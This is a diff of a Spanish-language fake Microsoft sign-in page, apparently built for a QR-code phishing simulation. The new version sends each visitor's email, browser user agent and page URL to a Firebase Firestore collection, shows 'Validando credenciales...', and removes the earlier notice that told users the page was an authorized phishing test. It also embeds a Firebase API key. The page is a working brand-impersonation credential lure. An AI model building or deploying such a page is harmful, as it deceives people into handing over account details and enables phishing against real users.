@@ -1,112 +1,134 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Microsoft Sign In</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Iniciar sesión</title>
 
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
+<style>
+  body {
+    margin: 0;
+    font-family: "Segoe UI", Arial, sans-serif;
+    background: #f3f3f3;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
 
-    .login-box {
-      background: white;
-      width: 380px;
-      padding: 40px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-    }
+  .box {
+    width: 380px;
+    background: white;
+    padding: 40px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+  }
 
-    .logo {
-      width: 110px;
-      margin-bottom: 20px;
-    }
+  .logo {
+    width: 120px;
+    margin-bottom: 20px;
+  }
 
-    h2 {
-      font-weight: normal;
-      margin-bottom: 25px;
-    }
+  h2 {
+    font-weight: 400;
+    margin-bottom: 20px;
+  }
 
-    input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      font-size: 14px;
-      box-sizing: border-box;
-    }
+  input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 15px;
+    border: 1px solid #ccc;
+    font-size: 14px;
+  }
 
-    button {
-      width: 100%;
-      padding: 12px;
-      background: #0067b8;
-      color: white;
-      border: none;
-      cursor: pointer;
-      font-size: 15px;
-    }
+  button {
+    width: 100%;
+    padding: 12px;
+    background: #0078d4;
+    color: white;
+    border: none;
+    cursor: pointer;
+  }
 
-    button:hover {
-      background: #005da6;
-    }
-  </style>
+  button:hover {
+    background: #005a9e;
+  }
+
+  .msg {
+    margin-top: 15px;
+    font-size: 13px;
+    color: #444;
+  }
+</style>
 </head>
+
 <body>
 
-<div class="login-box">
-  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
+<div class="box">
 
-  <h2>Iniciar sesión</h2>
+  <img class="logo"
+       src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"/>
 
-  <form id="loginForm">
-    <input type="email" id="email" placeholder="Correo electrónico" required>
+  <h2>Inicio de sesión</h2>
 
-    <input type="password" id="password" placeholder="Contraseña" required>
+  <form id="form" style="width: 90%;">
+    <input type="email"
+           id="email"
+           placeholder="usuario@empresa.com"
+           required />
+    <input type="password"
+           id="password"
+           placeholder="Contraseña"
+           required />
 
-    <button type="submit">Iniciar sesión</button>
+    <button type="submit" style="width: 30%;">Continuar</button>
   </form>
+
+  <div class="msg" id="msg"></div>
+
 </div>
 
-<script>
-const webhook = "https://maverickelpatodesarrollador.github.io/qr-login/";
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-app.js";
+import { getFirestore, collection, addDoc, serverTimestamp }
+from "https://www.gstatic.com/firebasejs/12.13.0/firebase-firestore.js";
 
-const form = document.getElementById("loginForm");
+const firebaseConfig = {
+    apiKey: "AIzaSyBvCZB4lfB8bTGkcTQOpcPjmLs6WS13EbI",
+    authDomain: "qr-login-2f6ce.firebaseapp.com",
+    projectId: "qr-login-2f6ce",
+    storageBucket: "qr-login-2f6ce.firebasestorage.app",
+    messagingSenderId: "1038991800898",
+    appId: "1:1038991800898:web:3051e179228d9c0f440bdb"
+  };
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app, "(default)");
+
+const form = document.getElementById("form");
+const msg = document.getElementById("msg");
 
 form.addEventListener("submit", async (e) => {
-    e.preventDefault();
+  e.preventDefault();
 
-    const payload = {
-        usuario: document.getElementById("email").value,
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        passwordIntroducida: true
-    };
+  const email = document.getElementById("email").value;
 
-    try {
-        await fetch(webhook, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        });
-    } catch (err) {
-        console.log(err);
-    }
+  try {
+    await addDoc(collection(db, "qr_phishing_simulation"), {
+      email: email,
+      campaign: "qr_test_01",
+      event: "access_attempt",
+      timestamp: serverTimestamp(),
+      userAgent: navigator.userAgent,
+      page: window.location.href
+    });
 
-    document.body.innerHTML = `
-        <div style="font-family: Arial; text-align:center; padding:40px;">
-            <h1>Simulación de phishing</h1>
-            <p>Has participado en un ejercicio interno autorizado.</p>
-            <p>No se ha almacenado ninguna contraseña.</p>
-        </div>
-    `;
+    msg.innerText = "Validando credenciales...";
+    form.reset();
+
+  } catch (err) {
+    msg.innerText = "Error de conexión";
+  }
 });
 </script>
 
